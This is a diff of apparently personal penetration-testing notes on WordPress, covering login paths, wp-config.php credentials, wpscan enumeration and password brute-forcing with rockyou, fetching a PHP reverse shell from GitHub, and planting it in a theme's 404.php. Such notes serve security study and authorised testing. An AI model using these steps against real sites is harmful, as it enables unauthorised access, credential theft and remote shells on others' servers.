@@ -1,15 +1,47 @@
 # Wordpress 
 
-Checklist:
-- Login page
+
+#### Important Access Issues
+
+If you do compromise a Wordpress site admin account some versions have a nasty feature of preventing login-by-mistake:
+- Do not `Press remind my later` or `This is my email`
+- press `update` and do not update it 
+
+
+#### Checklist
+
+- Get Wordress version - see below
+- Login pages including 
+	- `/wp-admin/login.php`
+    - `/wp-admin/wp-login.php`
+    - `/login.php`
+    - `/wp-login.php`
+- Themes and Plugins are stored: `/wp-content/` 
+- Uploads are stored: `/wp-content/uploads/`
+- Core file (certificates, fonts, JavaScript and widgets) are stored `/wp-includes/`
+- `wp-sitemap.xml` *Wordpress versions 5.5 and greater, Worpress generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.*
 - `robots.txt`
+- `license.txt`
 - `/var/www/html/wp-config.php` contain credentials
 - Enumerate users with `-u` with `wpscan`
 
-## Cheatsheet
+Get WordPress Version
+```bash
+curl https://$victim.tld/$wordpress | grep 'content="WordPress'
+```
 
-[Free 25 API requests per day](https://wpscan.com/pricing)
+#### Wordpress Accounts 
 
+[HackTricks Wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
+- **Administrator** `admin : ...`
+- **Editor**: Publish and manages his and others posts
+- **Author**: Publish and manage his own posts
+- **Contributor**: Write and manage his posts but cannot publish them
+- **Subscriber**: Browser posts and edit their profile
+
+#### `wpscan`
+
+`wpscan` has [free 25 API requests per day](https://wpscan.com/pricing)
 ```bash
 # -e not argument - default is vp,vt,tt,cb,dbe,u,m
 wpscan --url $url --rua -e --api-token $APIKEY # -o filename
@@ -27,7 +59,10 @@ wpscan --url $url --api-token $APIKEY -U admin -P /usr/share/wordlists/rockyou.t
 --disable-tls-checks
 ```
 
-
+Display all potential vulnerabilities to `stdout`
+```bash
+cat zeroauth.wpscan | grep 'Title' -A 1
+```
 #### Scanning and Enumeration 
 
 ```bash
@@ -55,8 +90,7 @@ https://monsite.com/wp-includes
 # Get WPEngine's config file
 /_wpeprivate/config.json
 ```
-
-#### Directory  Busting 
+#### Content Discovery
 
 Seclist wordlists
 ```bash
@@ -66,13 +100,6 @@ Seclist wordlists
 ```
 
 #### Shells
-Seclists
-```bash
-/usr/share/wordlists/seclists/Web-Shells/WordPress
-/usr/share/wordlists/Web-Shells/laudanum-1.0/wordpress/templates/shell.php
-```
-
-#### Reverse Shells
 
 ```bash
 # You can reverse shell by editing templates (404.php, footer.php...)
@@ -81,7 +108,16 @@ Seclists
 # Beware Theme must be active 
 curl -L https://raw.githubusercontent.com/jbarcia/Web-Shells/master/laudanum/wordpress/templates/php-reverse-shell.php -o php-reverse-shell.php
 ```
+Seclists
+```bash
+/usr/share/wordlists/seclists/Web-Shells/WordPress
+/usr/share/wordlists/Web-Shells/laudanum-1.0/wordpress/templates/shell.php
+```
 
+404.php on the theme and browser to it to get a shell:
+```php
+/wordpress/wp-content/themes/twentyfifteen/404.php
+```
 
 
 [[Metasploit]] - Minor improvements from https://www.hackingarticles.in/wordpress-reverse-shell/
@@ -108,3 +144,4 @@ For example the modifying the 404.php page for the twentyfifteen theme will loca
 
 [haax.fr](https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/wordpress/)
 [hackingarticles - wordpress reverse shell](https://www.hackingarticles.in/wordpress-reverse-shell/)
+[HackTricks Wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
